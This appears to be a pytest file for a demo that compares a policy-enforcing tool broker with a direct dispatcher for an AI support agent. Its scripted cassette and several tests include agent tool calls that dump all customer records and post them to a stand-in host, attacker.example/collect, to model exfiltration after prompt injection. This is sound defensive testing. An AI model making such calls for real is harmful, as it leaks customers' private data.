import json

import httpx
import pytest

from agent.llm import Cassette
from agent.loop import run_task
from agent.tools import BrokeredDispatcher, DirectDispatcher
from broker.backends import Backends
from mocks.seed_db import seed_customers

CASSETTE = [
    {"type": "tool_use", "tool": "read_document", "args": {"doc_id": "ticket-4711"}},
    {"type": "tool_use", "tool": "read_document", "args": {"doc_id": "kb/refund-policy"}},
    {"type": "tool_use", "tool": "query_customers", "args": {"filter": "id=8812"}},
    {"type": "tool_use", "tool": "query_customers", "args": {"filter": "all"}},
    {"type": "tool_use", "tool": "http_fetch", "args": {"url": "https://attacker.example/collect"}},
    {
        "type": "tool_use",
        "tool": "http_fetch",
        "args": {"url": "https://docstore.internal/feedback"},
    },
    {
        "type": "tool_use",
        "tool": "send_email",
        "args": {"to": ["customer:8812"], "subject": "Your refund", "body": "Processed."},
    },
    {"type": "final", "text": "Ticket triaged; some actions were not permitted."},
]


@pytest.fixture
def cassette(tmp_path):
    path = tmp_path / "support-triage.json"
    path.write_text(json.dumps(CASSETTE))
    return Cassette(path)


def test_cassette_replays_steps_in_order(cassette):
    assert cassette.next_step([])["tool"] == "read_document"
    assert cassette.next_step([])["tool"] == "read_document"
    assert cassette.next_step([])["tool"] == "query_customers"


def test_cassette_replay_is_deterministic(tmp_path):
    path = tmp_path / "c.json"
    path.write_text(json.dumps(CASSETTE))
    first = [Cassette(path).next_step([]) for _ in range(3)]
    second = [Cassette(path).next_step([]) for _ in range(3)]
    assert first == second


def test_brokered_dispatcher_sends_the_token(tmp_path):
    seen = {}

    def handler(request):
        seen["auth"] = request.headers.get("authorization")
        seen["path"] = request.url.path
        return httpx.Response(200, json={"content": "ok", "rows": 0})

    dispatcher = BrokeredDispatcher(
        broker_url="http://broker:8080",
        token="tok-123",
        client=httpx.Client(transport=httpx.MockTransport(handler)),
    )
    dispatcher.call("read_document", {"doc_id": "x"})
    assert seen["auth"] == "Bearer tok-123"
    assert seen["path"] == "/v1/tools/read_document/invoke"


def test_brokered_dispatcher_surfaces_denials_as_data_not_exceptions(tmp_path):
    def handler(request):
        return httpx.Response(
            403, json={"error": "policy_denied", "rule": "egress.pii_sink", "message": "no"}
        )

    dispatcher = BrokeredDispatcher(
        broker_url="http://broker:8080",
        token="tok",
        client=httpx.Client(transport=httpx.MockTransport(handler)),
    )
    result = dispatcher.call("http_fetch", {"url": "https://x.internal/a"})
    assert result["error"] == "policy_denied"
    assert result["rule"] == "egress.pii_sink"


def test_the_loop_runs_every_cassette_step_and_stops_on_final(cassette):
    calls = []

    class RecordingDispatcher:
        def call(self, tool, args):
            calls.append(tool)
            return {"content": "ok", "rows": 0}

    transcript = run_task(RecordingDispatcher(), cassette, task_id="4711")
    assert calls == [
        "read_document",
        "read_document",
        "query_customers",
        "query_customers",
        "http_fetch",
        "http_fetch",
        "send_email",
    ]
    assert transcript[-1]["type"] == "final"


def test_a_denial_does_not_stop_the_loop(cassette):
    class DenyingDispatcher:
        def call(self, tool, args):
            if tool == "http_fetch":
                return {"error": "policy_denied", "rule": "egress.allowlist"}
            return {"content": "ok", "rows": 0}

    transcript = run_task(DenyingDispatcher(), cassette, task_id="4711")
    assert transcript[-1]["type"] == "final"


def test_direct_dispatcher_bypasses_the_broker_entirely(tmp_path):
    seen = {}

    def handler(request):
        seen["url"] = str(request.url)
        return httpx.Response(200, text="raw")

    dispatcher = DirectDispatcher(
        docstore_url="http://docstore.internal",
        db_path=tmp_path / "customers.db",
        mailer_url="http://mailer.internal",
        client=httpx.Client(transport=httpx.MockTransport(handler)),
    )
    dispatcher.call("http_fetch", {"url": "https://attacker.example/collect"})
    assert seen["url"] == "https://attacker.example/collect"


def test_a_dispatcher_transport_failure_does_not_stop_the_loop(cassette):
    class RaisingDispatcher:
        def call(self, tool, args):
            raise RuntimeError("connection refused")

    transcript = run_task(RaisingDispatcher(), cassette, task_id="4711")
    assert transcript[-1]["type"] == "final"


def test_direct_dispatcher_matches_backends_for_the_same_filter(tmp_path):
    db_path = tmp_path / "customers.db"
    seed_customers(db_path, count=120)

    def handler(request):
        return httpx.Response(200, text="unused")

    direct = DirectDispatcher(
        docstore_url="http://docstore.internal",
        db_path=db_path,
        mailer_url="http://mailer.internal",
        client=httpx.Client(transport=httpx.MockTransport(handler)),
    )
    backends = Backends(
        docstore_url="http://docstore.internal",
        db_path=db_path,
        mailer_url="http://mailer.internal",
        client=httpx.Client(transport=httpx.MockTransport(handler)),
    )

    for filter_expr in ("plan=pro", "id=8812"):
        direct_result = direct.call("query_customers", {"filter": filter_expr})
        backend_result = backends.execute("query_customers", {"filter": filter_expr})
        assert json.loads(direct_result["content"]) == json.loads(backend_result.content)
        assert direct_result["rows"] == backend_result.rows


def test_both_profiles_hand_the_model_the_same_response_envelope(tmp_path):
    """The tool result is appended to the conversation verbatim.

    So if the two profiles' envelopes differed by even one key, a live A/B
    would be feeding the model different text and the comparison would not be
    controlled. The broker always answers {"content", "rows"} (broker/app.py);
    DirectDispatcher must too, for every tool.
    """
    db_path = tmp_path / "customers.db"
    seed_customers(db_path, count=5)

    def handler(request):
        return httpx.Response(200, text="body")

    kwargs = dict(
        docstore_url="http://docstore.internal",
        db_path=db_path,
        mailer_url="http://mailer.internal",
        client=httpx.Client(transport=httpx.MockTransport(handler)),
    )
    direct, backends = DirectDispatcher(**kwargs), Backends(**kwargs)

    calls = {
        "read_document": {"doc_id": "ticket-4711"},
        "http_fetch": {"url": "http://attacker.example/collect", "body": "x"},
        "send_email": {"to": ["customer:1"], "subject": "s", "body": "b"},
        "query_customers": {"filter": "id=1"},
    }
    for tool, args in calls.items():
        result = backends.execute(tool, args)
        brokered = {"content": result.content, "rows": result.rows}
        assert direct.call(tool, args).keys() == brokered.keys(), tool


# --- The --live path -------------------------------------------------------
#
# LiveClient.next_step never passed `tools=`, so the model was never told any
# tools existed, no tool_use block could come back, and every turn returned
# `final` on the first response. TOOL_SCHEMAS was dead code outside tests, and
# http_fetch's schema had no `body` -- so even a working live client could only
# issue bare GETs and the exfiltration attempt would carry nothing.
#
# These drive LiveClient through a stub in place of the anthropic client. They
# pin the request shape and the message alternation; they cannot prove the real
# API accepts it. The `anthropic` package is deliberately not a dependency, so
# the live path is NOT exercised end to end anywhere, here or in CI.


class _Block:
    """A content block shaped like the SDK's, for the stub responses below."""

    def __init__(self, **fields):
        self.__dict__.update(fields)


class _Response:
    def __init__(self, content):
        self.content = content


class StubAnthropic:
    """Records every messages.create call and replays queued responses."""

    def __init__(self, responses):
        self._responses = list(responses)
        self.calls = []
        self.messages = self

    def create(self, **kwargs):
        # Snapshot `messages`: LiveClient passes its live history list and
        # keeps appending to it, so recording the reference would let later
        # turns rewrite what an earlier call is asserted to have sent. The real
        # SDK serializes at call time, so the aliasing is harmless in
        # production and only matters to this recorder.
        self.calls.append({**kwargs, "messages": list(kwargs["messages"])})
        return self._responses.pop(0)


def _tool_use(block_id, name, args):
    return _Block(type="tool_use", id=block_id, name=name, input=args)


def _text(value):
    return _Block(type="text", text=value)


def test_live_client_declares_the_tools():
    """Without `tools=`, no tool_use block can ever come back -- the whole
    --live path collapses to a single text turn."""
    from agent.llm import MAX_TOKENS, MODEL, LiveClient
    from agent.tools import TOOL_SCHEMAS

    stub = StubAnthropic([_Response([_text("done")])])
    LiveClient("key", client=stub).next_step([{"role": "user", "content": "triage"}])

    call = stub.calls[0]
    assert call["tools"] == TOOL_SCHEMAS
    assert call["max_tokens"] == MAX_TOKENS
    assert call["model"] == MODEL


def test_live_client_returns_a_tool_use_step_the_loop_understands():
    from agent.llm import LiveClient

    stub = StubAnthropic(
        [_Response([_tool_use("toolu_1", "read_document", {"doc_id": "ticket-4711"})])]
    )
    step = LiveClient("key", client=stub).next_step([{"role": "user", "content": "triage"}])

    assert step == {
        "type": "tool_use",
        "tool": "read_document",
        "args": {"doc_id": "ticket-4711"},
    }


def test_live_client_returns_text_as_a_final_step():
    from agent.llm import LiveClient

    stub = StubAnthropic([_Response([_text("Ticket triaged."), _text("Done.")])])
    step = LiveClient("key", client=stub).next_step([{"role": "user", "content": "triage"}])

    assert step["type"] == "final"
    assert "Ticket triaged." in step["text"]


def test_live_client_prefers_a_tool_use_block_over_accompanying_text():
    from agent.llm import LiveClient

    stub = StubAnthropic(
        [_Response([_text("I'll read the ticket."), _tool_use("toolu_1", "read_document", {})])]
    )
    step = LiveClient("key", client=stub).next_step([{"role": "user", "content": "triage"}])

    assert step["type"] == "tool_use"


def test_live_client_maintains_assistant_user_alternation_with_tool_results():
    """The API rejects a tool_use turn that is not answered by a tool_result
    with a matching id. The loop only knows how to append a plain user message,
    so LiveClient has to do this mapping itself."""
    from agent.llm import LiveClient

    first = _tool_use("toolu_abc", "read_document", {"doc_id": "ticket-4711"})
    stub = StubAnthropic([_Response([first]), _Response([_text("all done")])])
    client = LiveClient("key", client=stub)

    messages = [{"role": "user", "content": "triage"}]
    step = client.next_step(messages)
    assert step["type"] == "tool_use"

    # What agent/loop.py does after dispatching the call.
    messages.append({"role": "user", "content": json.dumps({"content": "the ticket"})})
    client.next_step(messages)

    sent = stub.calls[1]["messages"]
    assert [message["role"] for message in sent] == ["user", "assistant", "user"]
    # The assistant turn is echoed back verbatim, blocks and all.
    assert sent[1]["content"] == [first]
    assert sent[2]["content"] == [
        {
            "type": "tool_result",
            "tool_use_id": "toolu_abc",
            "content": json.dumps({"content": "the ticket"}),
        }
    ]


def test_live_client_drives_the_real_loop():
    """End to end through run_task with a stub client: the loop cannot tell a
    live client from a cassette, which is the property that makes --live worth
    offering at all."""
    from agent.llm import LiveClient
    from agent.loop import run_task

    stub = StubAnthropic(
        [
            _Response([_tool_use("t1", "read_document", {"doc_id": "ticket-4711"})]),
            _Response([_tool_use("t2", "http_fetch", {"url": "http://x/y", "body": "rows"})]),
            _Response([_text("done")]),
        ]
    )
    calls = []

    class RecordingDispatcher:
        def call(self, tool, args):
            calls.append((tool, args))
            return {"content": "ok", "rows": 0}

    transcript = run_task(RecordingDispatcher(), LiveClient("key", client=stub), task_id="4711")

    assert [tool for tool, _ in calls] == ["read_document", "http_fetch"]
    assert calls[1][1]["body"] == "rows"
    assert transcript[-1] == {"type": "final", "text": "done"}


def test_the_http_fetch_schema_advertises_the_body_field():
    """Without this, a live model can only issue bare GETs and the unprotected
    profile leaks nothing -- exactly the defect the cassette already had."""
    from agent.tools import TOOL_SCHEMAS

    schema = next(tool for tool in TOOL_SCHEMAS if tool["name"] == "http_fetch")
    properties = schema["input_schema"]["properties"]
    assert "body" in properties
    assert properties["body"]["type"] == "string"
    assert schema["input_schema"]["required"] == ["url"]  # body stays optional


def test_every_advertised_tool_is_one_the_broker_actually_implements():
    """A schema naming a tool the broker does not know would be denied under
    tools.allowed on every call -- a live run that fails for a reason that has
    nothing to do with the demo."""
    from agent.tools import TOOL_SCHEMAS
    from broker.backends import TOOLS

    assert {tool["name"] for tool in TOOL_SCHEMAS} == set(TOOLS)


def test_advertised_schemas_agree_with_the_brokers_shape_check():
    """The broker rejects malformed args before any decision is made. A schema
    whose required fields disagree with that check would produce a live run
    where every call is audited input.malformed."""
    from broker.app import _args_are_well_shaped
    from agent.tools import TOOL_SCHEMAS

    samples = {
        "read_document": {"doc_id": "ticket-4711"},
        "query_customers": {"filter": "id=8812"},
        "http_fetch": {"url": "http://docstore.internal/feedback", "body": "[]"},
        "send_email": {"to": ["customer:8812"], "subject": "s", "body": "b"},
    }
    for schema in TOOL_SCHEMAS:
        args = samples[schema["name"]]
        assert set(schema["input_schema"]["required"]) <= set(args)
        assert _args_are_well_shaped(schema["name"], args), schema["name"]
